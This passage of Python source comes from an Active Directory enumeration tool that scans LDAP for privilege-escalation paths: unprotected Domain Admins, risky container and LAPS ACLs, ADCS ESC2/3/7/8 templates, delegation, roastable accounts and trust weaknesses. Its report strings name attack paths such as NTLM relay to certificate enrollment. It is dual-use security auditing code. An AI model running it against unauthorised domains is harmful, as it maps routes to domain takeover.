            for m in listify(conn.entries[0]["member"].values):
                protected_users_dns.add(str(m).lower())

        conn.search(
            search_base=domain_dn,
            search_filter="(sAMAccountName=Domain Admins)",
            search_scope=SUBTREE,
            attributes=["member"],
        )
        if conn.entries:
            for mdn in listify(conn.entries[0]["member"].values):
                mdn_str = str(mdn)
                if mdn_str.lower() in protected_users_dns:
                    continue                                     
                try:
                    conn.search(
                        search_base=mdn_str, search_filter="(objectClass=user)",
                        search_scope=BASE,
                        attributes=["sAMAccountName","userAccountControl","objectClass"],
                    )
                    if not conn.entries:
                        continue
                    me   = conn.entries[0]
                    msam = str(me["sAMAccountName"].value or "?")
                    muac = int(me["userAccountControl"].value or 0) if me["userAccountControl"].value else 0
                    clss = [c.lower() for c in me["objectClass"].values]
                    if "user" not in clss:
                        continue                
                    disabled = bool(muac & UAC_DISABLED)
                                                                                                      
                    if disabled:
                        continue
                    findings["da_not_protected_users"].append({
                        "sam":      msam,
                        "dn":       mdn_str,
                        "disabled": disabled,
                        "severity": "HIGH",
                        "finding": (
                            f"Domain Admin '{msam}' is NOT a member of 'Protected Users'. "
                            "Accounts outside Protected Users are vulnerable to: "
                            "NTLM credential capture, delegation attacks, Kerberos encryption "
                            "downgrade, and credential caching on compromised workstations. "
                            "Add DA accounts to Protected Users group."
                        ),
                    })
                except Exception:
                    pass
    except Exception:
        pass

                                                                             
                                                                      
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Scanning CN=Users / CN=Computers container ACLs...{Style.RESET_ALL}")
    BUILTIN_CONTAINERS = [
        f"CN=Users,{domain_dn}",
        f"CN=Computers,{domain_dn}",
        f"CN=Builtin,{domain_dn}",
    ]
    for container_dn in BUILTIN_CONTAINERS:
        try:
            conn.search(
                search_base=container_dn,
                search_filter="(objectClass=*)",
                search_scope=BASE,
                attributes=["nTSecurityDescriptor","distinguishedName"],
                controls=sd_ctrl,
            )
            if not conn.entries:
                continue
            raw_sd_l = conn.entries[0]["nTSecurityDescriptor"].raw_values
            if not raw_sd_l:
                continue
            cont_sd    = raw_sd_l[0]
            cont_owner = parse_sd_owner(cont_sd)
            cont_oname = resolve_sid_to_name(conn, domain_dn, cont_owner) if cont_owner else "?"
            is_owner_susp = (
                cont_owner not in priv_sids
                and not (domain_sid and cont_owner.endswith("-512"))
                and cont_owner not in ("S-1-5-18","S-1-5-32-544","","S-1-5-9")
            )
            if is_owner_susp:
                findings["container_dangerous_acls"].append({
                    "container": container_dn,
                    "trustee_sid":  cont_owner,
                    "trustee_name": cont_oname,
                    "right":        "OWNER",
                    "severity":     "CRITICAL",
                    "finding": (
                        f"[CRITICAL] Container '{container_dn}' is owned by "
                        f"'{cont_oname}'. Owner can modify the container DACL and "
                        "gain CreateChild/DeleteChild rights over all objects in the container."
                    ),
                })
            for ace in parse_aces(cont_sd):
                if ace["type"] not in (0x00, 0x05):
                    continue
                if ace["inherited"]:
                    continue                      
                trustee = ace["trustee"]
                is_legit = (
                    trustee in priv_sids
                    or (domain_sid and trustee.startswith(domain_sid + "-") and
                        trustee.split("-")[-1] in ("512","516","519","518","520","521","500"))
                    or trustee in ("S-1-5-18","S-1-5-32-544","S-1-5-9","S-1-5-10","S-1-5-11")
                )
                if is_legit:
                    continue
                rights = check_rights(ace["access_mask"], ace["guid"], include_all=False)
                if not rights:
                    continue
                trustee_name = resolve_sid_to_name(conn, domain_dn, trustee)
                for right in rights:
                    sev = SEVERITY.get(right, "LOW")
                    if sev not in ("CRITICAL","HIGH","MEDIUM"):
                        continue
                    findings["container_dangerous_acls"].append({
                        "container":    container_dn,
                        "trustee_sid":  trustee,
                        "trustee_name": trustee_name,
                        "right":        right,
                        "inherited":    ace["inherited"],
                        "severity":     "CRITICAL" if sev == "CRITICAL" else "HIGH",
                        "finding": (
                            f"'{trustee_name}' has {right} on container '{container_dn}'. "
                            "This grants control over ALL objects in this container — "
                            "an attacker can create, modify, or delete user/computer objects."
                        ),
                    })
        except Exception:
            pass

                                                                             
                                                                    
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking Windows LAPS (ms-LAPS-EncryptedPassword) ACLs...{Style.RESET_ALL}")
    WLAPS_GUID = WLAPS_PASSWORD_GUID                                          
    WLAPS_GUID2 = WLAPS_ENCRYPTEDPASSWORD_GUID                      
    try:
        laps_comp_entries = paged_search_all(
            conn, domain_dn,
            search_filter="(objectClass=computer)",
            attributes=["sAMAccountName","nTSecurityDescriptor","dNSHostName"],
            page_size=page_size,
            extra_controls=sd_ctrl,
        )
        laps_acl_seen: set = set()
        for e in laps_comp_entries:
            attrs   = e.get("attributes", {})
            sam_c   = str(first_value(attrs.get("sAMAccountName")) or "?")
            raw_sd_l = e.get("raw_attributes", {}).get("nTSecurityDescriptor", [])
            if not raw_sd_l:
                continue
            for ace in parse_aces(raw_sd_l[0]):
                if ace["type"] not in (0x00, 0x05):
                    continue
                guid_l = (ace["guid"] or "").lower()
                                                                                    
                can_read_laps = (
                    (ace["access_mask"] & 0x00000010 and guid_l in (WLAPS_GUID, WLAPS_GUID2)) or
                    (ace["access_mask"] & 0x00000100 and not ace["guid"]) or                     
                    (ace["access_mask"] & 0x000F01FF) == 0x000F01FF              
                )
                if not can_read_laps:
                    continue
                trustee = ace["trustee"]
                is_legit = (
                    trustee in priv_sids
                    or (domain_sid and trustee.startswith(domain_sid + "-") and
                        trustee.split("-")[-1] in ("512","516","519","518","500","516"))
                    or trustee in ("S-1-5-18","S-1-5-32-544","S-1-5-9")
                )
                if is_legit:
                    continue
                combo = (trustee, sam_c)
                if combo in laps_acl_seen:
                    continue
                laps_acl_seen.add(combo)
                trustee_name = resolve_sid_to_name(conn, domain_dn, trustee)
                findings["windows_laps_acl"].append({
                    "trustee_sid":  trustee,
                    "trustee_name": trustee_name,
                    "computer":     sam_c,
                    "computer_dn":  e.get("dn",""),
                    "severity":     "HIGH",
                    "finding": (
                        f"'{trustee_name}' can read Windows LAPS password "
                        f"(ms-LAPS-EncryptedPassword) on computer '{sam_c}'. "
                        "This gives local administrator access to the machine."
                    ),
                })
    except Exception:
        pass

                                                                             
                                                 
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Scanning ADCS ESC2/ESC3/ESC7/ESC8...{Style.RESET_ALL}")
    pki_base = f"CN=Public Key Services,CN=Services,CN=Configuration,{domain_dn}"
    ENROLL_GUID    = "0e10c968-78fb-11d2-90d4-00c04f79dc55"
    AUTOENROLL_GUID = "a05b8cc2-17bc-4802-a710-e7c15ab866a2"
    MANAGE_CA_GUID  = "a05b8cc2-17bc-4802-a710-e7c15ab866a3"                           
    LOW_PRIV_TRUSTEES_ESC = {
        "S-1-1-0",            
        "S-1-5-11",                      
        "S-1-5-7",             
    }
    AUTH_EKUS_ESC = {
        "1.3.6.1.5.5.7.3.2",
        "1.3.6.1.4.1.311.20.2.2",
        "2.5.29.37.0",
        "1.3.6.1.5.2.3.4",
    }
    ENROLL_AGENT_EKU = "1.3.6.1.4.1.311.20.2.1"                             
    try:
        tmpl_entries = paged_search_all(
            conn, pki_base,
            search_filter="(objectClass=pKICertificateTemplate)",
            attributes=["cn","msPKI-Certificate-Name-Flag","msPKI-Enrollment-Flag",
                        "msPKI-RA-Signature","pKIExtendedKeyUsage",
                        "nTSecurityDescriptor","distinguishedName"],
            page_size=200,
            extra_controls=sd_ctrl,
        )
        for tmpl_e in tmpl_entries:
            tmpl_attrs = tmpl_e.get("attributes", {})
            tmpl_name  = str(first_value(tmpl_attrs.get("cn")) or "?")
            name_flag   = int(first_value(tmpl_attrs.get("msPKI-Certificate-Name-Flag")) or 0)
            enroll_flag = int(first_value(tmpl_attrs.get("msPKI-Enrollment-Flag")) or 0)
            ra_sig      = int(first_value(tmpl_attrs.get("msPKI-RA-Signature")) or 0)
            ekus        = [str(e_) for e_ in listify(tmpl_attrs.get("pKIExtendedKeyUsage"))]
            has_auth_eku  = any(e_ in AUTH_EKUS_ESC for e_ in ekus) or not ekus
            has_enroll_agent_eku = ENROLL_AGENT_EKU in ekus
            enrollee_supplies_san = bool(name_flag & 0x1)
            manager_approval      = bool(enroll_flag & 0x2)
            raw_sd_list = tmpl_e.get("raw_attributes", {}).get("nTSecurityDescriptor", [])
            if not raw_sd_list:
                continue
            tmpl_sd = raw_sd_list[0]
            for ace in parse_aces(tmpl_sd):
                if ace["type"] not in (0x00, 0x05):
                    continue
                guid_l       = (ace["guid"] or "").lower()
                can_enroll   = (ace["access_mask"] & 0x100 and
                                (not guid_l or guid_l in (ENROLL_GUID, AUTOENROLL_GUID)))
                lp_trustee   = ace["trustee"] in LOW_PRIV_TRUSTEES_ESC
                                                                                                 
                if can_enroll and lp_trustee:
                    any_purpose_eku = "2.5.29.37.0" in ekus or not ekus
                    no_manager      = not manager_approval
                    if any_purpose_eku and no_manager:
                        trustee_name = resolve_sid_to_name(conn, domain_dn, ace["trustee"])
                        findings["adcs_esc2"].append({
                            "template_name": tmpl_name,
                            "dn":            tmpl_e.get("dn",""),
                            "enrollee_sid":  ace["trustee"],
                            "enrollee_name": trustee_name,
                            "ekus":          ekus,
                            "severity":      "CRITICAL",
                            "finding": (
                                f"[ESC2-CRITICAL] Template '{tmpl_name}' has Any Purpose / No EKU "
                                f"and '{trustee_name}' can enroll. "
                                "Obtained cert can be used for client auth as ANY user — "
                                "same impact as ESC1."
                            ),
                        })
                                                                                    
                if can_enroll and lp_trustee and has_enroll_agent_eku and not manager_approval:
                    trustee_name = resolve_sid_to_name(conn, domain_dn, ace["trustee"])
                    findings["adcs_esc3"].append({
                        "template_name": tmpl_name,
                        "dn":            tmpl_e.get("dn",""),
                        "enrollee_sid":  ace["trustee"],
                        "enrollee_name": trustee_name,
                        "severity":      "CRITICAL",
                        "finding": (
                            f"[ESC3-CRITICAL] Template '{tmpl_name}' is an Enrollment Agent template "
                            f"and '{trustee_name}' can enroll. "
                            "An enrollment agent can request certificates ON BEHALF OF any user, "
                            "including domain admins — full domain takeover."
                        ),
                    })
                                                                             
        ca_entries = paged_search_all(
            conn, pki_base,
            search_filter="(objectClass=pKIEnrollmentService)",
            attributes=["cn","nTSecurityDescriptor","distinguishedName","dNSHostName"],
            page_size=50,
            extra_controls=sd_ctrl,
        )
        for ca_e in ca_entries:
            ca_attrs = ca_e.get("attributes", {})
            ca_name  = str(first_value(ca_attrs.get("cn")) or "?")
            raw_ca_sd = ca_e.get("raw_attributes", {}).get("nTSecurityDescriptor", [])
            if not raw_ca_sd:
                continue
            for ace in parse_aces(raw_ca_sd[0]):
                if ace["type"] not in (0x00, 0x05):
                    continue
                trustee = ace["trustee"]
                is_legit = (
                    trustee in priv_sids
                    or (domain_sid and trustee.startswith(domain_sid + "-") and
                        trustee.split("-")[-1] in ("512","516","519","518","500"))
                    or trustee in ("S-1-5-18","S-1-5-32-544","S-1-5-9")
                )
                if is_legit:
                    continue
                                                                          
                manage_ca   = bool(ace["access_mask"] & 0x00000001)
                manage_cert = bool(ace["access_mask"] & 0x00000002)
                if manage_ca or manage_cert:
                    trustee_name = resolve_sid_to_name(conn, domain_dn, trustee)
                    right_desc   = ("ManageCA" if manage_ca else "") +                                   ("+ManageCertificates" if manage_cert else "")
                    findings["adcs_esc7"].append({
                        "ca_name":      ca_name,
                        "dn":           ca_e.get("dn",""),
                        "trustee_sid":  trustee,
                        "trustee_name": trustee_name,
                        "rights":       right_desc,
                        "severity":     "HIGH",
                        "finding": (
                            f"[ESC7-HIGH] '{trustee_name}' has {right_desc} on CA '{ca_name}'. "
                            "ManageCA can enable EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6 condition). "
                            "ManageCertificates can issue/approve failed requests as any user."
                        ),
                    })
                                                                                  
        try:
            aia_dn = f"CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,{domain_dn}"
            conn.search(
                search_base=aia_dn,
                search_filter="(objectClass=certificationAuthority)",
                search_scope=SUBTREE,
                attributes=["cn","cACertificate"],
            )
            if conn.entries:
                for ca_e2 in conn.entries:
                    ca_n2 = str(ca_e2["cn"].value or "?")
                                                             
                    findings["adcs_esc8"].append({
                        "ca_name":  ca_n2,
                        "severity": "HIGH",
                        "finding": (
                            f"[ESC8-HIGH] CA '{ca_n2}' detected — verify if NTLM-based "
                            "HTTP enrollment endpoint (certsrv) is enabled. "
                            "If so, NTLM relay from a machine account to the CA web endpoint "
                            "allows certificate request as that machine (PetitPotam → ESC8). "
                            "Disable NTLM on enrollment endpoint or require EPA/channel binding."
                        ),
                    })
        except Exception:
            pass
    except Exception:
        pass

    return findings


                                                                                
                
                                                                                
def _sev_color(sev: str) -> str:
    return SEVERITY_COLOR.get(sev, Fore.WHITE)

def _sev_icon(sev: str) -> str:
    return SEVERITY_ICON.get(sev, "⚪")

def _hr(char="═", n=None) -> str:
    return Fore.RED + char * (n or W) + Style.RESET_ALL

def _section(title: str):
    pad  = max(0, W - len(title) - 4) // 2
    line = f"{'─'*pad}  {title}  {'─'*pad}"
    print(f"\n{Fore.CYAN}{line}{Style.RESET_ALL}")

def _finding_header(title: str, count: int, severity: str):
    col  = _sev_color(severity)
    icon = _sev_icon(severity)
    line = f"  {icon} {col}{severity:8s}{Style.RESET_ALL}  {Fore.WHITE}{title}{Style.RESET_ALL}  [{count}]"
    print(f"\n{line}")
    print(f"  {'─'*70}")


                                                                                
                    
                                                                                
def print_acl_results(target: str, results: list, target_type: str = "user"):
    print(f"\n{_hr()}")
    print(f"\n  {Fore.CYAN}🎯 ACL Results  ›  {Fore.WHITE}{target}  "
          f"{Fore.CYAN}[{target_type}]{Style.RESET_ALL}")
    if not results:
        print(f"  {Fore.GREEN}✔ No dangerous rights found.{Style.RESET_ALL}")
        print(f"\n{_hr()}\n")
        return

    by_sev = {"CRITICAL": [], "HIGH": [], "MEDIUM": [], "LOW": []}
    for r in results:
        by_sev.setdefault(r.get("severity","LOW"), []).append(r)

    summary = []
    for sev in ("CRITICAL","HIGH","MEDIUM","LOW"):
        items = by_sev.get(sev, [])
        if items:
            col  = _sev_color(sev)
            icon = _sev_icon(sev)
            summary.append(f"{icon} {col}{sev}:{Style.RESET_ALL} {len(items)}")
    print(f"  Summary: " + "  ".join(summary))
    print()

    seen_combo = set()
    for sev in ("CRITICAL","HIGH","MEDIUM","LOW"):
        for r in by_sev.get(sev, []):
            combo = (r["right"], r["object_dn"])
            if combo in seen_combo:
                continue
            seen_combo.add(combo)
            col     = _sev_color(sev)
            icon    = _sev_icon(sev)
            right   = r["right"]
            tech    = r.get("technique", right)
            methods = r.get("methods", [])
            atkvec  = r.get("attack_vector", "")

            print(f"  {icon} {col}{sev:8s}{Style.RESET_ALL}  {Fore.WHITE}{right}{Style.RESET_ALL}")
            print(f"       {Fore.CYAN}Target    :{Style.RESET_ALL} "
                  f"{Fore.YELLOW}{r['object_name']}{Style.RESET_ALL}  "
                  f"{Fore.LIGHTBLACK_EX}[{r['object_class']}]{Style.RESET_ALL}")
            print(f"       {Fore.CYAN}DN        :{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}{r['object_dn']}{Style.RESET_ALL}")
            print(f"       {Fore.CYAN}Rights    :{Style.RESET_ALL} {r['verbose_rights']}")
            print(f"       {Fore.CYAN}Technique :{Style.RESET_ALL} {tech}")
            if methods:
                print(f"       {Fore.CYAN}Methods   :{Style.RESET_ALL} {', '.join(methods)}")
            if atkvec:
                                                    
                words   = atkvec.split()
                line_   = ""
                lines_  = []
                for w in words:
                    if len(line_) + len(w) + 1 > 65:
                        lines_.append(line_)
                        line_ = w
                    else:
                        line_ = (line_ + " " + w).strip()
                if line_:
                    lines_.append(line_)
                prefix = f"       {Fore.CYAN}Attack    :{Style.RESET_ALL} "
                for idx, ln in enumerate(lines_):
                    if idx == 0:
                        print(f"{prefix}{Fore.LIGHTYELLOW_EX}{ln}{Style.RESET_ALL}")
                    else:
                        print(f"       {'':12s}{Fore.LIGHTYELLOW_EX}{ln}{Style.RESET_ALL}")
            inh = f" {Fore.LIGHTBLACK_EX}[inherited]{Style.RESET_ALL}" if r.get("inherited") else ""
            print(f"       {Fore.CYAN}ACE Type  :{Style.RESET_ALL} {r['ace_type_name']}{inh}")
            if r.get("guid"):
                print(f"       {Fore.CYAN}GUID      :{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}{r['guid']}{Style.RESET_ALL}")
            print()

    print(f"{_hr()}\n")


                                                                                
                                           
                                                                                
def print_group_members(group: str, members: list, indent: int = 0):
    if indent == 0:
        print(f"\n{_hr()}")
        print(f"\n  {Fore.CYAN}👥 Members of '{group}'{Style.RESET_ALL}")
        if not members:
            print(f"  {Fore.YELLOW}(empty){Style.RESET_ALL}")
            print(f"\n{_hr()}\n")
            return
    pad = "  " * (indent + 1)
    for m in members:
        t_col = Fore.CYAN if m["type"] == "Group" else Fore.WHITE
        dis   = f" {Fore.RED}[DISABLED]{Style.RESET_ALL}" if m.get("disabled") else ""
        print(f"{pad}{t_col}{m['sam']}{Style.RESET_ALL}  [{m['type']}]{dis}")
        if m.get("nested"):
            print_group_members(m["sam"], m["nested"], indent + 1)
    if indent == 0:
        print(f"\n{_hr()}\n")


def print_member_of(username: str, groups: list):
    print(f"\n{_hr()}")
    print(f"\n  {Fore.CYAN}🔑 Group Memberships  ›  {username}{Style.RESET_ALL}")
    if not groups:
        print(f"  {Fore.YELLOW}(no group memberships found){Style.RESET_ALL}")
    for g in groups:
        print(f"    {Fore.YELLOW}{g['name']}{Style.RESET_ALL}  {Fore.LIGHTBLACK_EX}{g['dn']}{Style.RESET_ALL}")
    print(f"\n{_hr()}\n")


def print_is_nested(group: str, parents: list):
    print(f"\n{_hr()}")
    print(f"\n  {Fore.CYAN}🔗 '{group}' is nested inside:{Style.RESET_ALL}")
    if not parents:
        print(f"  {Fore.YELLOW}(not nested in any other group){Style.RESET_ALL}")
    for p in parents:
        print(f"    {Fore.YELLOW}{p['name']}{Style.RESET_ALL}  {Fore.LIGHTBLACK_EX}{p['dn']}{Style.RESET_ALL}")
    print(f"\n{_hr()}\n")


                                                                                
                    
                                                                                
def print_priv_access(data: dict):
    print(f"\n{_hr()}")
    print(f"\n  {Fore.CYAN}🔐 Privileged Access Enumeration{Style.RESET_ALL}\n")

    if data.get("sql_instances"):
        _section("MSSQL Service Accounts")
        for s in data["sql_instances"]:
            kerb = f"  {Fore.RED}[KERBEROASTABLE]{Style.RESET_ALL}" if s.get("kerberoastable") else ""
            print(f"    {Fore.YELLOW}{s['account']}{Style.RESET_ALL}  →  {s['instance']}{kerb}")

    for key, label in (("rdp_group_members","RDP — Remote Desktop Users"),
                       ("winrm_group_members","WinRM — Remote Management Users")):
        if data.get(key):
            _section(label)
            for m in data[key]:
                dis = f"  {Fore.RED}[DISABLED]{Style.RESET_ALL}" if m.get("disabled") else ""
                print(f"    {Fore.WHITE}{m['sam']}{Style.RESET_ALL}  [{m['type']}]{dis}")

    for key, label in (("domain_users_rdp_hosts","Domain Users in RDP Group"),
                       ("domain_users_winrm_hosts","Domain Users in WinRM Group")):
        if data.get(key):
            _section(label)
            for r in data[key]:
                print(f"    {Fore.RED}⚠  {r['warning']}{Style.RESET_ALL}")
                print(f"       Group: {r['group']}")

    if data.get("unconstrained_delegation"):
        _section("Unconstrained Delegation")
        for u in data["unconstrained_delegation"]:
            sev_col = Fore.RED if u.get("severity") == "CRITICAL" else Fore.YELLOW
            print(f"    {sev_col}[{u.get('severity','?')}]{Style.RESET_ALL}  "
                  f"{Fore.WHITE}{u['sam']}{Style.RESET_ALL}  [{u['type']}]")
            if u.get("dns"):
                print(f"       DNS: {u['dns']}")
            print(f"       {Fore.LIGHTBLACK_EX}{u.get('impact','')}{Style.RESET_ALL}")
            print()

    if data.get("constrained_delegation"):
        _section("Constrained Delegation")
        for c in data["constrained_delegation"]:
            sev_col = Fore.YELLOW if c.get("severity") == "HIGH" else Fore.WHITE
            pt = f"  {Fore.RED}[PROTOCOL-TRANSITION]{Style.RESET_ALL}" if c.get("protocol_transition") else ""
            print(f"    {sev_col}[{c.get('severity','?')}]{Style.RESET_ALL}  "
                  f"{Fore.WHITE}{c['sam']}{Style.RESET_ALL}  [{c['type']}]{pt}")
            for t in c.get("allowed_targets", []):
                print(f"       → {t}")
            print()

    print(f"{_hr()}\n")


                                                                                
                       
                                                                                
def print_admin_sdholder(data: dict):
    print(f"\n{_hr()}")
    print(f"\n  {Fore.CYAN}🛡  AdminSDHolder ACL Analysis{Style.RESET_ALL}")
    print(f"  DN: {Fore.LIGHTBLACK_EX}{data.get('dn','')}{Style.RESET_ALL}")
    owner = data.get("owner","")
    if owner:
        print(f"  Owner SID: {owner}")
    if data.get("error"):
        print(f"  {Fore.RED}Error: {data['error']}{Style.RESET_ALL}")
        return
    findings = data.get("findings", [])
    if not findings:
        print(f"\n  {Fore.GREEN}✔ No unexpected ACEs found on AdminSDHolder.{Style.RESET_ALL}")
    else:
        print(f"\n  {Fore.RED}⚠  {len(findings)} dangerous ACE(s) found — propagated to ALL protected accounts!{Style.RESET_ALL}\n")
        for f in findings:
            col  = _sev_color(f.get("severity","LOW"))
            icon = _sev_icon(f.get("severity","LOW"))
            print(f"  {icon} {col}{f.get('severity','?'):8s}{Style.RESET_ALL}  {f['right']}")
            print(f"       Trustee  : {f['trustee']}")
            print(f"       Rights   : {f.get('verbose','')}")
            print(f"       Technique: {f.get('technique','')}")
            if f.get("attack_vector"):
                print(f"       Attack   : {Fore.LIGHTYELLOW_EX}{f['attack_vector'][:120]}{Style.RESET_ALL}")
            print(f"       {Fore.RED}{f.get('impact','')}{Style.RESET_ALL}")
            print()

    pa = data.get("protected_accounts", [])
    if pa:
        _section(f"adminCount=1 Protected Accounts ({len(pa)})")
        for p in pa:
            dis = f"  {Fore.RED}[DISABLED]{Style.RESET_ALL}" if p.get("disabled") else ""
            print(f"    {Fore.YELLOW}{p['sam']}{Style.RESET_ALL}  [{p['type']}]{dis}")
    print(f"\n{_hr()}\n")


                                                                                
                     
                                                                                
def print_domain_recon(recon: dict):
    print(f"\n{_hr()}")
    print(f"\n  {Fore.CYAN}🌐 Domain Recon{Style.RESET_ALL}\n")

    di = recon.get("domain_info", {})
    if di:
        _section("Domain Info")
        for k, v in di.items():
            print(f"    {Fore.CYAN}{k:20s}{Style.RESET_ALL}: {v}")

    maq = recon.get("machine_account_quota", {})
    if maq:
        _section("Machine Account Quota")
        print(f"    {Fore.CYAN}{'quota':20s}{Style.RESET_ALL}: {maq.get('quota','?')}")
        if maq.get("finding"):
            print(f"    {Fore.LIGHTBLACK_EX}{maq['finding']}{Style.RESET_ALL}")

    pp = recon.get("password_policy", {})
    if pp:
        _section("Password Policy")
        for k, v in pp.items():
            print(f"    {Fore.CYAN}{k:20s}{Style.RESET_ALL}: {v}")

    priv_groups = recon.get("privileged_groups", {})
    if priv_groups:
        _section("Privileged Groups")
        for gname, info in priv_groups.items():
            count = info.get("member_count", 0)
            disabled = info.get("disabled_members", 0)
            line = f"    {Fore.YELLOW}{gname}{Style.RESET_ALL}: {count} member(s)"
            if disabled:
                line += f"  {Fore.LIGHTBLACK_EX}({disabled} disabled){Style.RESET_ALL}"
            print(line)
            members = info.get("members", [])
            if members:
                print(f"       {', '.join(members[:10])}")

    for key, label, icon in (
        ("kerberoastable",     "Kerberoastable Accounts",   "⚠"),
        ("asrep_roastable",    "ASREP Roastable Accounts",  "⚠"),
        ("pwd_never_expires",  "Password Never Expires",    "⚠"),
        ("pwd_not_required",   "Password Not Required",     "⚠"),
        ("admin_count",        "adminCount=1 Accounts",     "⚠"),
        ("interesting_accounts","Interesting Accounts",     "ℹ"),
    ):
        items = recon.get(key, [])
        if items:
            _section(f"{icon}  {label}  [{len(items)}]")
            for i in items[:50]:
                is_priv = i.get("is_privileged") or i.get("admin_count", 0) == 1
                priv_tag = f"  {Fore.RED}[PRIVILEGED]{Style.RESET_ALL}" if is_priv else ""
                dis_tag = f"  {Fore.LIGHTBLACK_EX}[DISABLED]{Style.RESET_ALL}" if i.get("disabled") else ""
                print(f"    {Fore.YELLOW}{i.get('sam','?')}{Style.RESET_ALL}{priv_tag}{dis_tag}")
                if i.get("spns"):
                    print(f"       SPNs: {', '.join(i['spns'][:3])}")
                if i.get("member_of"):
                    print(f"       Groups: {', '.join(i['member_of'][:3])}")
                if i.get("flags"):
                    print(f"       Flags: {', '.join(i['flags'])}")
                if i.get("finding"):
                    print(f"       {Fore.LIGHTBLACK_EX}{i['finding']}{Style.RESET_ALL}")

    comp_os = recon.get("computers_by_os", {})
    if comp_os:
        _section("Computers by OS")
        for os_, cnt in sorted(comp_os.items(), key=lambda x: -x[1]):
            print(f"    {cnt:4d}  {os_}")

    laps = recon.get("laps_computers", [])
    if laps:
        _section(f"⚠  Computers WITH LAPS  [{len(laps)}]")
        for c in laps[:20]:
            print(f"    {Fore.GREEN}{c['sam']}{Style.RESET_ALL}  {Fore.LIGHTBLACK_EX}{c['os']}{Style.RESET_ALL}")
        if len(laps) > 20:
            print(f"    {Fore.LIGHTBLACK_EX}... and {len(laps)-20} more{Style.RESET_ALL}")

    no_laps = recon.get("no_laps_computers", [])
    if no_laps:
        _section(f"⚠  Computers WITHOUT LAPS  [{len(no_laps)}]")
        for c in no_laps[:20]:
            print(f"    {Fore.YELLOW}{c['sam']}{Style.RESET_ALL}  {Fore.LIGHTBLACK_EX}{c['os']}{Style.RESET_ALL}")
        if len(no_laps) > 20:
            print(f"    {Fore.LIGHTBLACK_EX}... and {len(no_laps)-20} more{Style.RESET_ALL}")

    print(f"\n{_hr()}\n")

                                                                                
                                
                                                                                
def print_trust_enum(trusts: list, domain: str):
    print(f"\n{_hr()}")
    print(f"\n  {Fore.CYAN}🔗 Domain Trust Enumeration  ›  {domain}{Style.RESET_ALL}\n")
    if not trusts:
        print(f"  {Fore.YELLOW}No trusts found.{Style.RESET_ALL}")
        print(f"\n{_hr()}\n")
        return
    for t in trusts:
        print(f"  {Fore.WHITE}{t['name']}{Style.RESET_ALL}")
        print(f"    Type      : {t['type']}")
        print(f"    Direction : {t['direction']}  —  {t['direction_desc']}")
        print(f"    SID Filter: {'ENABLED' if t['sid_filtering'] else Fore.RED + 'DISABLED' + Style.RESET_ALL}")
        if t.get("trust_flags"):
            print(f"    Flags     : {', '.join(t['trust_flags'])}")
        if t.get("sid"):
            print(f"    SID       : {Fore.LIGHTBLACK_EX}{t['sid']}{Style.RESET_ALL}")
        if not t["sid_filtering"] and t["direction_raw"] in (2, 3):
            print(f"    {Fore.RED}⚠  SID Filtering disabled + outbound trust = SIDHistory injection risk!{Style.RESET_ALL}")
        print()
    print(f"{_hr()}\n")


def print_trust_deep(trusts: list, domain: str, cross_enum: dict):
    print_trust_enum(trusts, domain)
    if not cross_enum:
        return
    print(f"\n{_hr()}")
    print(f"\n  {Fore.CYAN}🔍 Cross-Domain Enumeration Results{Style.RESET_ALL}\n")
    for tname, data in cross_enum.items():
        print(f"  {Fore.WHITE}{tname}{Style.RESET_ALL}")
        if not data.get("accessible"):
            print(f"    {Fore.YELLOW}Not accessible: {data.get('error','')}{Style.RESET_ALL}\n")
            continue
        print(f"    {Fore.GREEN}Accessible!{Style.RESET_ALL}")
        if data.get("admins"):
            print(f"    Domain Admins: {', '.join(data['admins'][:5])}")
        if data.get("users"):
            print(f"    Users enumerated: {len(data['users'])}")
        if data.get("spn_accounts"):
            print(f"    SPN accounts (Kerberoastable): {len(data['spn_accounts'])}")
        print()
    print(f"{_hr()}\n")


                                                                                
                       
                                                                                
def print_needle_results(findings: dict):
    total_issues = 0
    print(f"\n{_hr()}")
    print(f"\n  {Fore.RED}🔍 Needle — Hidden Privilege Scanner Results{Style.RESET_ALL}\n")

                                                                            
    sidh = findings.get("sidhistory_accounts", [])
    if sidh:
        total_issues += len(sidh)
        _finding_header("SIDHistory on Accounts", len(sidh), "CRITICAL")
        for r in sidh:
            sev = r.get("severity","HIGH")
            col = _sev_color(sev)
            dis = f"  {Fore.RED}[DISABLED]{Style.RESET_ALL}" if r.get("disabled") else ""
            priv = f"  {Fore.RED}[PRIV-SID!]{Style.RESET_ALL}" if r.get("has_priv_sid") else ""
            print(f"    {col}{r['sam']}{Style.RESET_ALL}  [{r['type']}]{dis}{priv}")
            for sh in r.get("sid_history", []):
                pf = f" {Fore.RED}[PRIVILEGED-RID]{Style.RESET_ALL}" if sh.get("is_privileged_rid") else ""
                print(f"       SIDHist: {sh['sid']}  ({sh['name']}){pf}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            if r.get("when_changed"):
                print(f"       Changed: {r['when_changed']}")
            print()

                                                                            
    sc_suspicious = [x for x in findings.get("shadow_creds_set", []) if x.get("is_suspicious")]
    sc_info       = [x for x in findings.get("shadow_creds_set", []) if not x.get("is_suspicious")]
    if sc_suspicious:
        total_issues += len(sc_suspicious)
        _finding_header("Shadow Credentials (Suspicious)", len(sc_suspicious), "HIGH")
        for r in sc_suspicious:
            dis = f"  {Fore.RED}[DISABLED]{Style.RESET_ALL}" if r.get("disabled") else ""
            print(f"    {Fore.LIGHTYELLOW_EX}{r['sam']}{Style.RESET_ALL}  [{r['type']}]{dis}")
            print(f"       Entries  : {r.get('credential_count',0)}")
            print(f"       Changed  : {r.get('when_changed','?')}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()
    if sc_info:
        _section(f"Shadow Credentials (Likely Legit / WHfB) [{len(sc_info)}]")
        for r in sc_info:
            print(f"    {Fore.LIGHTBLACK_EX}{r['sam']} [{r['type']}] — {r.get('credential_count',0)} entry/entries{Style.RESET_ALL}")

                                                                            
    rbcd = findings.get("rbcd_preconfigured", [])
    if rbcd:
        total_issues += len(rbcd)
        _finding_header("RBCD Pre-configured on Computers", len(rbcd), "HIGH")
        for r in rbcd:
